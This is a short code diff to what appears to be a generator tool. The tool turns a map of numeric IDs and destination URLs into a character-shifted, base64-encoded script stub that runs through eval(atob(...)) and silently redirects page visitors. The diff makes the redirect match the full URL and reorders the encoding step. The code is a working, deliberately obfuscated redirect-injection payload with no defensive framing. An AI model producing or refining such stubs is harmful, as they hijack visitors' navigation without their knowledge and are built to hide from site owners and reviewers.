@@ -41,13 +41,11 @@
             
             if (!Object.keys(m).length) return alert('Error');
 
-            // Ultra-Compact Payload
-            const p = `m=${JSON.stringify(m)};u=m[location.pathname.match(/\\d+/)];u&&location.replace(u)`;
-            
-            // Ultra-Compact Obfuscation
-            const enc = btoa(p.split('').map(c => String.fromCharCode(c.charCodeAt(0) + k)).join(''));
+            // Perfect & Mobile-Robust Payload
+            const p = `m=${JSON.stringify(m)};u=m[location.href.match(/\\d{10,}/)];u&&location.replace(u)`;
             
             // Perfect & Shortest Stub
+            const enc = btoa(p.split('').map(c => String.fromCharCode(c.charCodeAt(0) + k)).join(''));
             const stub = `<script>eval(atob("${enc}").replace(/./g,c=>String.fromCharCode(c.charCodeAt()-${k})))<\/script>`;
             
             $('res').innerText = stub;
